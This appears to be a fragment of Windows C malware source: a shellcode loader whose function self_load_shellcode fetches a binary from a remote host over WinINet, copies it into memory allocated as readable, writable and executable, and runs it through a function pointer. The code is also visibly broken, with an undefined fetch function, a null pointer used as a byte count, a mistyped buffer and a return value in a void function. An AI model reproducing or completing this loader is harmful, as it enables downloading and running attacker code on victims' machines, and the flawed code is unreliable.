#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

void* memMirror(void* dest, const void* src, size_t count) {
    char* x = (char*)dest, * y = (char*)src;
    while (count--) *x++ = *y++;
    return dest;
}

void self_load_shellcode(const wchar_t* hostname, const wchar_t* bin) {
    DWORD* bytesRead = 0;
    unsigned char* buffer[4096];
    
    fetchCode(hostname, bin, 8000, &buffer, &bytesRead);

    void* allocatedMemory = VirtualAlloc(0, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (allocatedMemory == NULL) {
        printf("Memory allocation failed\n");
        return 1;
    }

    memMirror(allocatedMemory, buffer, bytesRead);

    void (*functionPointer)() = (void (*)())allocatedMemory;

    functionPointer();
}
